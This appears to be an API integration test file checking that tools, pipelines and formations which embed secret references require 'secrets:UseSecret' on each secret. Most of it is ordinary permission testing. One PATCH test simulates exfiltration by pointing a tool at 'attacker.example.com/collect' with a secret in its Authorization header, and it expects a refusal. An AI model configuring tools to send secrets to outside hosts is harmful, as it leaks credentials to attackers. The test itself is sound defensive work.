import { authenticatedTestClient, loginAs, testClient } from '../../testClient';

/**
 * A tool that names a secret sends its value wherever the tool points, so
 * writing one needs `secrets:UseSecret` on every secret it names, on top of
 * the tool's own write action.
 */
describe('Tool secret use', () => {
  let adminToken: string;
  let toolsOnlyToken: string;
  let scopedToken: string;
  let projectId: string;
  let secretId: string;
  let otherSecretId: string;

  const TOOL_ACTIONS = [
    'tools:CreateTool',
    'tools:GetTool',
    'tools:UpdateTool',
    'tools:CallTool',
  ];

  const FORMATION_ACTIONS = [
    'formations:PlanFormation',
    'formations:CreateFormation',
    'formations:GetFormation',
  ];

  const grant = async (args: {
    username: string;
    statement: object[];
  }): Promise<string> => {
    const userRes = await authenticatedTestClient(adminToken)
      .post('/api/v1/users')
      .send({ username: args.username, password: 'usesecretpass' });
    const policyRes = await authenticatedTestClient(adminToken)
      .post('/api/v1/policies')
      .send({ document: { statement: args.statement } });
    expect(policyRes.status).toBe(201);
    await authenticatedTestClient(adminToken)
      .put(`/api/v1/users/${userRes.body.id}/policies`)
      .send({ policy_ids: [policyRes.body.id] });
    return loginAs(args.username, 'usesecretpass');
  };

  const httpTool = (args: { name: string; secret: string }) => {
    return {
      project_id: projectId,
      name: args.name,
      type: 'http',
      execute: {
        url: 'https://example.com/hook',
        method: 'POST',
        headers: { Authorization: `Bearer {{secret:${args.secret}}}` },
      },
    };
  };

  beforeAll(async () => {
    await testClient
      .post('/api/v1/users/bootstrap')
      .send({ username: 'tsuadmin', password: 'supersecret' });
    adminToken = await loginAs('tsuadmin', 'supersecret');

    const projectRes = await authenticatedTestClient(adminToken)
      .post('/api/v1/projects')
      .send({ name: 'Tool Secret Use Project' });
    projectId = projectRes.body.id;

    const secretRes = await authenticatedTestClient(adminToken)
      .post('/api/v1/secrets')
      .send({ project_id: projectId, name: 'tsu-key', value: 'sk-tsu' });
    secretId = secretRes.body.id;

    const otherSecretRes = await authenticatedTestClient(adminToken)
      .post('/api/v1/secrets')
      .send({ project_id: projectId, name: 'tsu-other', value: 'sk-other' });
    otherSecretId = otherSecretRes.body.id;

    toolsOnlyToken = await grant({
      username: 'tsutoolsonly',
      statement: [
        { effect: 'Allow', action: [...TOOL_ACTIONS, ...FORMATION_ACTIONS] },
      ],
    });

    scopedToken = await grant({
      username: 'tsuscoped',
      statement: [
        { effect: 'Allow', action: [...TOOL_ACTIONS, ...FORMATION_ACTIONS] },
        {
          effect: 'Allow',
          action: ['secrets:UseSecret'],
          resource: [`srn:${projectId}:secret:${secretId}`],
        },
      ],
    });
  });

  describe('POST /api/v1/tools', () => {
    test('a tool naming a secret the caller may use is created', async () => {
      const res = await authenticatedTestClient(scopedToken)
        .post('/api/v1/tools')
        .send(httpTool({ name: 'tsu-allowed', secret: secretId }));

      expect(res.status).toBe(201);
    });

    test('a tool naming a secret without secrets:UseSecret is refused', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/tools')
        .send(httpTool({ name: 'tsu-denied', secret: secretId }));

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
      expect(res.body.error.meta).toEqual({
        action: 'secrets:UseSecret',
        secret_ids: [secretId],
      });
    });

    test('secrets:UseSecret on one secret does not reach another', async () => {
      const res = await authenticatedTestClient(scopedToken)
        .post('/api/v1/tools')
        .send(httpTool({ name: 'tsu-other', secret: otherSecretId }));

      expect(res.status).toBe(403);
      expect(res.body.error.meta.secret_ids).toEqual([otherSecretId]);
    });

    test('an mcp tool naming a secret in its url is refused without it', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/tools')
        .send({
          project_id: projectId,
          name: 'tsu-mcp',
          type: 'mcp',
          mcp: { url: `https://example.com/mcp?key={{secret:${secretId}}}` },
        });

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    test('a pipeline whose inline step names a secret is refused without it', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/tools')
        .send({
          project_id: projectId,
          name: 'tsu-pipeline',
          type: 'pipeline',
          pipeline: {
            steps: [
              {
                id: 'send',
                tool: {
                  name: 'tsu-step',
                  type: 'http',
                  execute: {
                    url: 'https://example.com/hook',
                    headers: { Authorization: `{{secret:${secretId}}}` },
                  },
                },
              },
            ],
          },
        });

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    test('a tool naming no secret needs no secret permission', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/tools')
        .send({
          project_id: projectId,
          name: 'tsu-plain',
          type: 'http',
          execute: { url: 'https://example.com/hook', method: 'POST' },
        });

      expect(res.status).toBe(201);
    });

    test('an unauthenticated request is refused with 401', async () => {
      const res = await testClient
        .post('/api/v1/tools')
        .send(httpTool({ name: 'tsu-anon', secret: secretId }));

      expect(res.status).toBe(401);
    });
  });

  describe('PATCH /api/v1/tools/:tool_id', () => {
    let toolId: string;

    beforeAll(async () => {
      const res = await authenticatedTestClient(adminToken)
        .post('/api/v1/tools')
        .send(httpTool({ name: 'tsu-existing', secret: secretId }));
      expect(res.status).toBe(201);
      toolId = res.body.id;
    });

    test('rewriting execute with a secret is refused without secrets:UseSecret', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .patch(`/api/v1/tools/${toolId}`)
        .send({
          execute: {
            url: 'https://attacker.example.com/collect',
            method: 'POST',
            headers: { Authorization: `{{secret:${secretId}}}` },
          },
        });

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');

      const unchanged = await authenticatedTestClient(adminToken).get(
        `/api/v1/tools/${toolId}`
      );
      expect(unchanged.body.execute.url).toBe('https://example.com/hook');
    });

    test('rewriting execute with a secret the caller may use is applied', async () => {
      const res = await authenticatedTestClient(scopedToken)
        .patch(`/api/v1/tools/${toolId}`)
        .send({
          execute: {
            url: 'https://example.com/hook2',
            method: 'POST',
            headers: { Authorization: `{{secret:${secretId}}}` },
          },
        });

      expect(res.status).toBe(200);
    });

    test('an update that leaves execute untouched needs no secret permission', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .patch(`/api/v1/tools/${toolId}`)
        .send({ description: 'renamed by a tools-only caller' });

      expect(res.status).toBe(200);
    });

    test('an unauthenticated request is refused with 401', async () => {
      const res = await testClient
        .patch(`/api/v1/tools/${toolId}`)
        .send({ description: 'anon' });

      expect(res.status).toBe(401);
    });
  });

  describe('formations', () => {
    const toolTemplate = (args: { name: string; secret: string }) => {
      const { project_id: _projectId, ...properties } = httpTool(args);
      void _projectId;
      return { resources: { Hook: { type: 'tool', properties } } };
    };

    test('a declared tool naming a secret without secrets:UseSecret is refused, and nothing is applied', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/formations')
        .send({
          project_id: projectId,
          name: 'tsu-denied-stack',
          template: toolTemplate({ name: 'tsu-f-denied', secret: secretId }),
        });

      expect(res.status).toBe(403);
      expect(res.body.error.meta.denied_actions).toEqual([
        {
          logical_id: 'Hook',
          resource_type: 'tool',
          action: 'secrets:UseSecret',
        },
      ]);
    });

    test('a plan names the secret use the caller lacks', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/formations/plan')
        .send({
          project_id: projectId,
          template: toolTemplate({ name: 'tsu-f-plan', secret: secretId }),
        });

      expect(res.status).toBe(200);
      expect(res.body.unauthorized_actions).toEqual([
        {
          logical_id: 'Hook',
          resource_type: 'tool',
          action: 'secrets:UseSecret',
        },
      ]);
    });

    test('a secret named through a parameter is refused at apply', async () => {
      const res = await authenticatedTestClient(toolsOnlyToken)
        .post('/api/v1/formations')
        .send({
          project_id: projectId,
          name: 'tsu-param-stack',
          parameters: { SecretId: secretId },
          template: {
            parameters: { SecretId: { type: 'string' } },
            resources: {
              Hook: {
                type: 'tool',
                properties: {
                  name: 'tsu-f-param',
                  type: 'http',
                  execute: {
                    url: 'https://example.com/hook',
                    method: 'POST',
                    headers: {
                      Authorization: { sub: '{{secret:${SecretId}}}' },
                    },
                  },
                },
              },
            },
          },
        });

      expect(res.status).toBe(201);
      expect(res.body.status).toBe('failed');
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    test('a declared tool naming a secret the caller may use is applied', async () => {
      const res = await authenticatedTestClient(scopedToken)
        .post('/api/v1/formations')
        .send({
          project_id: projectId,
          name: 'tsu-allowed-stack',
          template: toolTemplate({ name: 'tsu-f-allowed', secret: secretId }),
        });

      expect(res.status).toBe(201);
      expect(res.body.status).toBe('active');
    });
  });
});
